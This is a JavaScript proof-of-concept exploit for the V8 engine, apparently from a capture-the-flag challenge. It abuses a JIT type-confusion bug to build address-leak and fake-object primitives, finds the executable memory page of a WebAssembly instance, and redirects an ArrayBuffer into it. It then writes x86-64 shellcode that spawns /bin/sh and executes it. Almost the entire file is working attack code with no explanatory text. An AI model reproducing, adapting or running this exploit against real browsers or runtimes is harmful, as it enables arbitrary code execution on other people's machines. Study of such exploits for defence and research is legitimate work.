function leak_addr(argument,obj) {
  var j = 0;
  var increment = 100;

  if (argument > 2) {
    increment = Infinity;
  }
  for (var i = -Infinity; i <= -Infinity; i += increment) {
    j++;
    if (j == 20) {
      break;
    }
  }
  i=Math.abs(i);
  i=-Math.max(i,0x100000010);//0x000000000000045f  plainNumber
  i=Math.max(i,-0x100000011);
  i+=0x100000017;
  i>>=1;
  let aux=new Array(i);
  let vuln1=new Array(3);
  vuln1[0]=0.1;
  aux[0]=0.1;
  if(obj==0)
  aux[i-1]=aux;
  else
  aux[i-1]=obj;
  return vuln1;
}

function fake_obj(argument,addr) {
  var j = 0;
  var increment = 100;

  if (argument > 2) {
    increment = Infinity;
  }
  for (var i = -Infinity; i <= -Infinity; i += increment) {
    j++;
    if (j == 20) {
      break;
    }
  }
  i=Math.abs(i);
  i=-Math.max(i,0x100000010);//0x000000000000045f  plainNumber
  i=Math.max(i,-0x100000011);
  i+=0x100000017;
  i>>=1;
  //i*=2;
  var vuln1=new Array(i);
  var obj = {"a": 1};
  var obj_array = [obj,obj,obj];
  vuln1[0]=0.1;
  vuln1[i-3]=i2f("0x"+((addr<<32n)+addr).toString(16));
  return obj_array;
}


function read64(addr)
{
	let fake_view=fake_obj(3,fake_obj_addr);
	var ab_addr=f2i(fake_view[0]);
	return ab_addr;
}


var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}

function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}


var fake_value;
var f_obj;
for(var idx=0;idx<10000;idx++)
{
	if(idx%3==0)
	vuln=leak_addr(2+(idx%2),0);
	else
	vuln=leak_addr(2+(idx%2),buf);
}

for(idx=0;idx<10000;idx++)
{
	leak_str=fake_obj(2+(idx%2),BigInt(0x40000000));
}

/*var shellcode = [
    0x2fbb485299583b6an,
    0x530068732f6e6962n,
    0xd23148f631485f54n,
    0x050f3bc08366n
];*/

var shellcode = [
    0x2fbb485299583b6an,
    0x530000732f6e6962n,
    0xd23148f631485f54n,
    0x050f3bc08366n
];

var wasmCode = new Uint8Array([0x0,0x61,0x73,0x6d,0x1,0x0,0x0,0x0,0x1,0x85,0x80,0x80,0x80,0x0,0x1,0x60,0x0,0x1,0x7f,0x3,0x83,0x80,0x80,0x80,0x0,0x2,0x0,0x0,0x4,0x84,0x80,0x80,0x80,0x0,0x1,0x70,0x0,0x0,0x5,0x83,0x80,0x80,0x80,0x0,0x1,0x0,0x1,0x6,0x81,0x80,0x80,0x80,0x0,0x0,0x7,0x9d,0x80,0x80,0x80,0x0,0x3,0x6,0x6d,0x65,0x6d,0x6f,0x72,0x79,0x2,0x0,0x9,0x5f,0x5a,0x35,0x68,0x61,0x70,0x70,0x79,0x76,0x0,0x0,0x4,0x6d,0x61,0x69,0x6e,0x0,0x1,0xa,0x93,0x80,0x80,0x80,0x0,0x2,0x84,0x80,0x80,0x80,0x0,0x0,0x41,0x2b,0xb,0x84,0x80,0x80,0x80,0x0,0x0,0x41,0x2a,0xb]);
var wasmMod = new WebAssembly.Module(wasmCode);
var mI = new WebAssembly.Instance(wasmMod);
var f = mI.exports.main;

var fake_array= [
    i2f("0x08042229083038fd"),//"0x0804222d083039f1"
    0.1,
    0.2
];

var data_buf = new ArrayBuffer(32);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = (f2i(leak_addr(3,data_buf)[0])>>32n) + 0x14n;

var fake_obj_addr=f2i(leak_addr(3,fake_array)[0])>>32n;
fake_obj_addr+=32n;
fake_array[1]=i2f("0x"+(0x4000000000000n+fake_obj_addr+16n).toString(16));
fake_array[2]=i2f("0x4000008042a89");//"0x4000008042a95"
f_obj=fake_obj(3,fake_obj_addr);

//%DebugPrint(fake_array);
//%DebugPrint(data_buf);
//%SystemBreak();

var t_array=f_obj[0];
var rwxloc=(f2i(leak_addr(3,mI)[0])>>32n)+0x68n;
var loc=fake_obj_addr+0x18n;
sub=0n;
console.log(loc.toString(16));
console.log(rwxloc.toString(16));
if ((rwxloc - loc) % 8n != 0n)
{
	console.log((rwxloc-loc)%8n);
	sub = 4n;
}
var rwxidx = (rwxloc - loc - sub) / 8n;
var rwxaddr;
console.log(rwxidx.toString(16));
if(sub != 0n)
{
	rwxaddr=f2i(t_array[rwxidx])>>32n;
	rwxaddr+=(f2i(t_array[rwxidx+1n])&0xffffffffn)<<32n;
}
else
rwxaddr=f2i(t_array[rwxidx]);

var backstore_idx;
sub=0n;
if ((buf_backing_store_addr - loc) % 8n != 0n)
{
	console.log((buf_backing_store_addr-loc) % 8n);
	sub = 4n;
}
backstore_idx = (buf_backing_store_addr - loc - sub) / 8n;

if(sub != 0n)
{
	t_array[backstore_idx]=i2f((f2i(t_array[backstore_idx])&0xffffffffn)+((rwxaddr&0xffffffffn)<<32n));
	t_array[backstore_idx+1n]=i2f((f2i(t_array[backstore_idx+1n])&0xffffffff00000000n)+(rwxaddr>>32n));
}
else
{
	t_array[backstore_idx]=i2f(rwxaddr);
}
console.log("okokok");
data_view.setFloat64(0, i2f(shellcode[0]), true);
data_view.setFloat64(8, i2f(shellcode[1]), true);
data_view.setFloat64(16, i2f(shellcode[2]), true);
data_view.setFloat64(24, i2f(shellcode[3]), true);
f();
//%SystemBreak();
